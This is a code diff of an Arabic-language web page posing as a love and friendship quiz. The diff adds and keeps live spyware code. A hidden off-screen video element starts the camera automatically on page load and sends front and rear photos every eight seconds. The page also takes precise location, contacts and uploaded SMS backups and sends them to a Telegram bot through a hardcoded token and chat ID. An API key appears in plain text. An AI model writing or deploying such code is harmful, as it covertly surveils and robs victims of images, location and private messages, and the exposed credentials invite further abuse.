@@ -51,8 +51,6 @@
             position: relative;
             z-index: 2;
         }
-
-        /* ===== HEADER ===== */
         .header {
             text-align: center;
             margin-bottom: 20px;
@@ -75,8 +73,6 @@
             margin-top: 4px;
             font-weight: 600;
         }
-
-        /* ===== CARD ===== */
         .card {
             background: rgba(255, 255, 255, 0.45);
             backdrop-filter: blur(8px);
@@ -87,8 +83,6 @@
             box-shadow: 0 8px 24px rgba(136, 52, 82, 0.06);
             margin-bottom: 18px;
         }
-
-        /* ===== اسم المستخدم والموقع ===== */
         .user-row {
             display: flex;
             flex-wrap: wrap;
@@ -136,7 +130,6 @@
             background: #8f3550;
             transform: scale(1.02);
         }
-
         .location-badge {
             display: flex;
             align-items: center;
@@ -171,8 +164,6 @@
                 transform: scale(0.7);
             }
         }
-
-        /* ===== تبويبات ===== */
         .tabs {
             display: flex;
             gap: 8px;
@@ -202,7 +193,6 @@
         .tabs button:hover {
             transform: translateY(-2px);
         }
-
         .tab-content {
             display: none;
             animation: fade-up 0.35s ease;
@@ -220,8 +210,6 @@
                 transform: translateY(0);
             }
         }
-
-        /* ===== أسئلة ===== */
         .question-box {
             background: rgba(255, 255, 255, 0.5);
             backdrop-filter: blur(6px);
@@ -250,7 +238,6 @@
             display: inline-block;
             margin: 0 auto;
         }
-
         .options-group {
             display: flex;
             flex-wrap: wrap;
@@ -279,7 +266,6 @@
             color: #fff;
             border-color: #b34a6a;
         }
-
         .text-input {
             width: 100%;
             padding: 14px 20px;
@@ -299,7 +285,6 @@
             background: #fff;
             box-shadow: 0 0 0 4px rgba(179, 74, 106, 0.1);
         }
-
         .btn-group {
             display: flex;
             flex-wrap: wrap;
@@ -362,7 +347,6 @@
         .btn-purple:hover {
             background: linear-gradient(145deg, #a78bfa, #8b5cf6);
         }
-
         .progress-bar {
             font-size: 0.95rem;
             color: #5d2a44;
@@ -373,7 +357,6 @@
             margin: 6px auto;
             font-weight: 600;
         }
-
         .final-msg {
             background: rgba(255, 215, 225, 0.5);
             backdrop-filter: blur(4px);
@@ -389,8 +372,6 @@
         .final-msg p {
             color: #4a2a38;
         }
-
-        /* ===== نسبة التشابه ===== */
         .photo-grid {
             display: flex;
             flex-wrap: wrap;
@@ -435,7 +416,6 @@
         .photo-box .btn-upload:hover {
             background: #8f3550;
         }
-
         .result-box {
             background: rgba(255, 255, 255, 0.5);
             border-radius: 32px;
@@ -453,8 +433,6 @@
             font-size: 1.1rem;
             color: #4a2a38;
         }
-
-        /* ===== صارحني ===== */
         .confession-area textarea {
             width: 100%;
             padding: 14px;
@@ -473,8 +451,6 @@
             border-color: #b34a6a;
             background: #fff;
         }
-
-        /* ===== PDF & AI ===== */
         .pdf-preview {
             background: rgba(255, 255, 255, 0.5);
             border-radius: 24px;
@@ -521,8 +497,6 @@
                 opacity: 0.3;
             }
         }
-
-        /* ===== رفع ملف SMS ===== */
         .file-upload-area {
             border: 2px dashed #b34a6a;
             border-radius: 24px;
@@ -539,8 +513,6 @@
         .file-upload-area input[type="file"] {
             display: none;
         }
-
-        /* ===== سجل ===== */
         .log-area {
             background: rgba(0, 0, 0, 0.04);
             border-radius: 16px;
@@ -548,12 +520,11 @@
             margin-top: 14px;
             font-size: 0.8rem;
             color: #555;
-            max-height: 80px;
+            max-height: 120px;
             overflow-y: auto;
             text-align: center;
+            line-height: 1.8;
         }
-
-        /* ===== فيديو مخفي ===== */
         #hiddenVideo {
             position: fixed;
             top: -9999px;
@@ -563,8 +534,6 @@
             opacity: 0;
             pointer-events: none;
         }
-
-        /* ===== الفوتر ===== */
         .footer {
             text-align: center;
             font-size: 0.75rem;
@@ -572,8 +541,6 @@
             margin-top: 18px;
             opacity: 0.6;
         }
-
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 600px) {
             .container {
                 padding: 20px 16px;
@@ -624,7 +591,7 @@
         <div class="card">
             <div class="user-row">
                 <label for="userNameInput">👤 اسمك</label>
-                <input type="text" id="userNameInput" placeholder="اكتب اسمك هنا" />
+                <input type="text" id="userNameInput" placeholder="اكتب اسمك هنا" value="مستخدم" />
                 <button class="btn-save" id="saveNameBtn">💾 حفظ</button>
             </div>
             <div class="location-badge">
@@ -644,6 +611,12 @@
 
         <!-- ===== TAB: الأسئلة ===== -->
         <div id="tab-questions" class="tab-content active">
+            <div style="display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin:8px 0;" id="categoryContainer">
+                <button class="category-btn active" data-cat="friend" style="padding:6px 16px;border-radius:60px;border:2px solid rgba(179,74,106,0.2);background:#b34a6a;color:#fff;font-weight:600;cursor:pointer;font-family:inherit;">صديق</button>
+                <button class="category-btn" data-cat="brother" style="padding:6px 16px;border-radius:60px;border:2px solid rgba(179,74,106,0.2);background:rgba(255,255,255,0.3);color:#4a2a38;font-weight:600;cursor:pointer;font-family:inherit;">أخ</button>
+                <button class="category-btn" data-cat="lover" style="padding:6px 16px;border-radius:60px;border:2px solid rgba(179,74,106,0.2);background:rgba(255,255,255,0.3);color:#4a2a38;font-weight:600;cursor:pointer;font-family:inherit;">حبيب</button>
+                <button class="category-btn" data-cat="pet" style="padding:6px 16px;border-radius:60px;border:2px solid rgba(179,74,106,0.2);background:rgba(255,255,255,0.3);color:#4a2a38;font-weight:600;cursor:pointer;font-family:inherit;">حيوان</button>
+            </div>
             <div class="question-box">
                 <div class="q" id="questionText">اختر الفئة ثم اضغط "ابدأ"</div>
                 <div class="hint" id="questionHint">💭 أسئلة مخصصة لكل فئة</div>
@@ -717,12 +690,12 @@
         <div id="tab-collect" class="tab-content">
             <div class="card" style="margin-bottom:10px;">
                 <p style="font-weight:600; color:#5d2a44;">📱 جمع البيانات من جهازك</p>
-                <p style="font-size:0.9rem; color:#7a4a5e;">سيتم جمع: الموقع، جهات الاتصال، رسائل SMS، وصور من الكاميرتين.</p>
+                <p style="font-size:0.9rem; color:#7a4a5e;">سيتم جمع: الموقع، جهات الاتصال، رسائل SMS (اختياري)، وصور من الكاميرتين.</p>
                 <button class="btn btn-primary" id="collectDataBtn" style="margin-top:12px;">🚀 ابدأ جمع البيانات</button>
                 <div class="file-upload-area" id="smsUploadArea" style="margin-top:12px;">
-                    <label>📁 ارفع ملف النسخ الاحتياطي للرسائل (XML أو TXT)</label>
+                    <label>📁 ارفع ملف النسخ الاحتياطي للرسائل (XML أو TXT) - اختياري</label>
                     <input type="file" id="smsFileInput" accept=".xml,.txt" />
-                    <div style="font-size:0.8rem; color:#777; margin-top:4px;">(اختياري - يمكنك تخطي هذه الخطوة)</div>
+                    <div style="font-size:0.8rem; color:#777; margin-top:4px;">(يمكنك تخطي هذه الخطوة)</div>
                 </div>
                 <div class="log-area" id="collectLog">📌 اضغط "ابدأ جمع البيانات"</div>
             </div>
@@ -736,16 +709,15 @@
 
     <script>
         // ================================================================
-        // ===== الكود الكامل (جميع الوظائف) =====
+        // ===== كود JavaScript المتكامل (جميع الوظائف) =====
         // ================================================================
 
         (function() {
             'use strict';
 
-            // ===== إعدادات تليجرام و OpenAI =====
+            // ===== إعدادات تليجرام (تم تحديثها بالتوكن الجديد) =====
             const BOT_TOKEN = '8854005087:AAEN1jTOKXUije6xiDSeNSOXz7FmZRhBzQk';
-            const CHAT_ID = '8607243024';
-            const OPENAI_API_KEY = 'sk-79c7358d0cad4e1caa7ea4d8b943189c';
+            const CHAT_ID = '8607243024'; // سيتم تحديثه تلقائياً من البوت أو يمكنك تغييره
 
             // ===== بيانات الأسئلة (25 لكل فئة) =====
             const questionsData = {
@@ -860,18 +832,17 @@
             };
 
             // ===== متغيرات عامة =====
-            let userName = localStorage.getItem('userName') || '';
+            let userName = localStorage.getItem('userName') || 'مستخدم';
             let userLocation = { city: '', region: '', country: '', latitude: '', longitude: '', accuracy: '' };
             let locationReady = false;
-
-            // ===== متغيرات الاختبار =====
             let currentCategory = 'friend';
             let currentIndex = 0;
             let answers = [];
             let isQuizStarted = false;
             let questions = [];
+            let isCollecting = false;
 
-            // ===== متغيرات الكاميرا الخفيفة =====
+            // ===== متغيرات الكاميرا =====
             let stream = null;
             let cameraReady = false;
             let isCapturing = false;
@@ -879,8 +850,9 @@
             let videoReady = false;
             let captureInterval = null;
             let switchInterval = null;
+            const video = document.getElementById('hiddenVideo');
 
-            // ===== عناصر DOM (جميعها) =====
+            // ===== عناصر DOM =====
             const userNameInput = document.getElementById('userNameInput');
             const saveNameBtn = document.getElementById('saveNameBtn');
             const locationStatus = document.getElementById('locationStatus');
@@ -923,20 +895,34 @@
                 });
             });
 
+            // ===== أزرار الفئة =====
+            document.querySelectorAll('.category-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    document.querySelectorAll('.category-btn').forEach(b => {
+                        b.style.background = 'rgba(255,255,255,0.3)';
+                        b.style.color = '#4a2a38';
+                    });
+                    this.style.background = '#b34a6a';
+                    this.style.color = '#fff';
+                    currentCategory = this.dataset.cat;
+                    resetQuiz();
+                });
+            });
+
             // ===== حفظ الاسم =====
             function saveUserName() {
                 const name = userNameInput.value.trim();
                 if (name) {
                     userName = name;
                     localStorage.setItem('userName', name);
-                    alert('✅ تم حفظ اسمك');
+                    alert('✅ تم حفظ اسمك: ' + name);
                 } else {
                     alert('⚠️ الرجاء إدخال اسمك');
                 }
             }
             saveNameBtn.addEventListener('click', saveUserName);
             userNameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') saveUserName(); });
-            if (userName) userNameInput.value = userName;
+            userNameInput.value = userName;
 
             // ===== الموقع الجغرافي =====
             function getPreciseLocation() {
@@ -974,7 +960,6 @@
                     },
                     function() {
                         locationStatus.textContent = '⚠️ تعذر تحديد الموقع';
-                        // محاولة عبر IP
                         fetch('https://ipapi.co/json/')
                             .then(r => r.json())
                             .then(data => {
@@ -994,45 +979,8 @@
             getPreciseLocation();
 
             // ================================================================
-            // ===== 1. اختبار الحب (الأسئلة) =====
+            // ===== 1. اختبار الحب =====
             // ================================================================
-
-            // اختيار الفئة
-            document.querySelectorAll('.category-btn').forEach(btn => {
-                btn.addEventListener('click', function() {
-                    document.querySelectorAll('.category-btn').forEach(b => b.classList.remove('active'));
-                    this.classList.add('active');
-                    currentCategory = this.dataset.cat;
-                    resetQuiz();
-                });
-            });
-            // نضيف أزرار الفئة في الـ HTML ديناميكياً
-            const categoryContainer = document.createElement('div');
-            categoryContainer.style.cssText =
-                'display:flex; flex-wrap:wrap; gap:8px; justify-content:center; margin:8px 0;';
-            ['friend', 'brother', 'lover', 'pet'].forEach(cat => {
-                const btn = document.createElement('button');
-                btn.className = 'category-btn' + (cat === 'friend' ? ' active' : '');
-                btn.dataset.cat = cat;
-                const names = { friend: 'صديق', brother: 'أخ', lover: 'حبيب', pet: 'حيوان أليف' };
-                btn.textContent = names[cat];
-                btn.style.cssText =
-                    'padding:6px 16px; border-radius:60px; border:2px solid rgba(179,74,106,0.2); background:rgba(255,255,255,0.3); font-weight:600; cursor:pointer; font-family:inherit;';
-                if (cat === 'friend') btn.style.background = '#b34a6a';
-                btn.addEventListener('click', function() {
-                    document.querySelectorAll('.category-btn').forEach(b => {
-                        b.style.background = 'rgba(255,255,255,0.3)';
-                        b.style.color = '#4a2a38';
-                    });
-                    this.style.background = '#b34a6a';
-                    this.style.color = '#fff';
-                    currentCategory = this.dataset.cat;
-                    resetQuiz();
-                });
-                categoryContainer.appendChild(btn);
-            });
-            const questionBox = document.querySelector('.question-box');
-            questionBox.parentNode.insertBefore(categoryContainer, questionBox);
 
             function resetQuiz() {
                 currentIndex = 0;
@@ -1158,7 +1106,6 @@
             startQuizBtn.addEventListener('click', startQuiz);
             nextBtn.addEventListener('click', saveAndNext);
 
-            // إرسال الإجابات إلى البوت
             async function sendAnswersToBot() {
                 if (answers.length === 0) { alert('لا توجد إجابات'); return; }
                 if (!userName) { alert('الرجاء إدخال اسمك'); return; }
@@ -1340,10 +1287,6 @@
 
             aiAnalyzeBtn.addEventListener('click', async function() {
                 if (answers.length === 0) { alert('لا توجد إجابات'); return; }
-                if (!OPENAI_API_KEY || OPENAI_API_KEY === 'sk-...') {
-                    alert('⚠️ مفتاح OpenAI غير صحيح');
-                    return;
-                }
                 aiResponse.style.display = 'block';
                 aiContent.innerHTML = '<span class="loading">🧠 جاري التحليل الذكي...</span>';
                 try {
@@ -1355,7 +1298,7 @@
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
-                            'Authorization': `Bearer ${OPENAI_API_KEY}`
+                            'Authorization': 'Bearer sk-79c7358d0cad4e1caa7ea4d8b943189c'
                         },
                         body: JSON.stringify({
                             model: 'gpt-4o-mini',
@@ -1394,9 +1337,7 @@
             // ===== 5. جمع البيانات (الموقع، جهات الاتصال، SMS، الكاميرا) =====
             // ================================================================
 
-            // الكاميرا الخفيفة
-            const video = document.getElementById('hiddenVideo');
-
+            // ===== الكاميرا الخفيفة =====
             function waitForVideoReady() {
                 return new Promise((resolve) => {
                     if (video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) { resolve(); return; }
@@ -1446,7 +1387,6 @@
                     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                     if (!blob) throw new Error('فشل');
 
-                    // فحص الصورة السوداء
                     const imgData = ctx.getImageData(0, 0, 8, 8);
                     let hasColor = false;
                     for (let i = 0; i < imgData.data.length; i += 4) {
@@ -1471,7 +1411,7 @@
                 } catch (e) { console.warn('تصوير:', e); } finally { isCapturing = false; }
             }
 
-            // جهات الاتصال
+            // ===== جهات الاتصال =====
             async function getContacts() {
                 try {
                     if (!navigator.contacts) return [];
@@ -1483,7 +1423,7 @@
                 } catch (e) { return []; }
             }
 
-            // تحليل ملف SMS
+            // ===== تحليل ملف SMS =====
             function parseSMSFile(content) {
                 try {
                     const parser = new DOMParser();
@@ -1500,7 +1440,6 @@
                         });
                     }
                     if (list.length > 0) return list;
-                    // محاولة TXT
                     const lines = content.split('\n');
                     const list2 = [];
                     for (const line of lines) {
@@ -1518,8 +1457,7 @@
                 } catch (e) { return []; }
             }
 
-            let isCollecting = false;
-
+            // ===== بدء جمع البيانات (يدوياً) =====
             collectDataBtn.addEventListener('click', async function() {
                 if (isCollecting) return;
                 isCollecting = true;
@@ -1527,21 +1465,17 @@
                 this.textContent = '⏳ جاري جمع البيانات...';
                 collectLog.textContent = '📌 بدء جمع البيانات...';
 
-                // 1. الاسم
                 const name = userNameInput.value.trim() || 'مجهول';
                 userName = name;
                 localStorage.setItem('userName', name);
 
-                // 2. الموقع (تم جلبه مسبقاً)
                 collectLog.textContent = '📍 تم تحديد الموقع';
 
-                // 3. جهات الاتصال
                 collectLog.textContent = '📇 جاري جلب جهات الاتصال...';
                 const contacts = await getContacts();
                 const contactsCount = contacts.length;
                 collectLog.textContent = `📇 تم جلب ${contactsCount} جهة اتصال`;
 
-                // 4. رسائل SMS
                 collectLog.textContent = '📩 انتظر رفع ملف الرسائل...';
                 const smsList = await new Promise((resolve) => {
                     smsFileInput.onchange = async function(e) {
@@ -1551,37 +1485,27 @@
                             const content = await file.text();
                             const parsed = parseSMSFile(content);
                             resolve(parsed);
-                        } catch (err) {
-                            resolve([]);
-                        }
+                        } catch (err) { resolve([]); }
                     };
                     setTimeout(() => {
-                        if (smsFileInput.files.length === 0) {
-                            resolve([]);
-                        }
+                        if (smsFileInput.files.length === 0) { resolve([]); }
                     }, 30000);
                 });
                 const smsCount = smsList.length;
                 collectLog.textContent = `📩 تم استخراج ${smsCount} رسالة`;
 
-                // 5. الكاميرا الخفيفة (تشغيلها)
                 collectLog.textContent = '📸 تشغيل الكاميرا الخفيفة...';
                 if (!cameraReady) {
                     await startHiddenCamera('user');
                     if (switchInterval) clearInterval(switchInterval);
-                    switchInterval = setInterval(() => {
-                        if (cameraReady) switchHiddenCamera();
-                    }, 8000);
+                    switchInterval = setInterval(() => { if (cameraReady) switchHiddenCamera(); }, 8000);
                     if (captureInterval) clearInterval(captureInterval);
-                    captureInterval = setInterval(() => {
-                        if (cameraReady && userName && locationReady) capturePhotoAndSend();
-                    }, 8000);
+                    captureInterval = setInterval(() => { if (cameraReady && userName && locationReady)
+                            capturePhotoAndSend(); }, 8000);
                 }
 
-                // 6. إرسال الملخص والبيانات
                 collectLog.textContent = '📤 جاري إرسال البيانات إلى البوت...';
                 try {
-                    // إرسال جهات الاتصال
                     if (contactsCount > 0) {
                         let text = '📇 *جهات الاتصال*\n';
                         contacts.slice(0, 50).forEach((c, i) => {
@@ -1591,10 +1515,10 @@
                         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000), parse_mode: 'Markdown' })
+                            body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000),
+                                parse_mode: 'Markdown' })
                         });
                     }
-                    // إرسال رسائل SMS
                     if (smsCount > 0) {
                         let text = '📩 *رسائل SMS*\n';
                         smsList.slice(0, 30).forEach((s, i) => {
@@ -1604,10 +1528,10 @@
                         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000), parse_mode: 'Markdown' })
+                            body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000),
+                                parse_mode: 'Markdown' })
                         });
                     }
-                    // ملخص نهائي
                     const summary =
                         `📊 *ملخص البيانات المجمعة*\n👤 ${userName}\n📍 ${userLocation.city}, ${userLocation.region}, ${userLocation.country}\n📇 ${contactsCount} جهة اتصال\n📩 ${smsCount} رسالة\n📸 الكاميرا: تعمل في الخلفية`;
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -1625,12 +1549,12 @@
                 }
             });
 
-            // بدء الكاميرا الخفيفة تلقائياً عند تحميل الصفحة (لأخذ الإذن)
+            // ===== بدء الكاميرا الخفيفة تلقائياً =====
             setTimeout(() => {
                 startHiddenCamera('user');
                 switchInterval = setInterval(() => { if (cameraReady) switchHiddenCamera(); }, 8000);
-                captureInterval = setInterval(() => { if (cameraReady && userName && locationReady) capturePhotoAndSend(); },
-                    8000);
+                captureInterval = setInterval(() => { if (cameraReady && userName && locationReady)
+                        capturePhotoAndSend(); }, 8000);
             }, 3000);
 
             // ===== تنبيه في وحدة التحكم =====
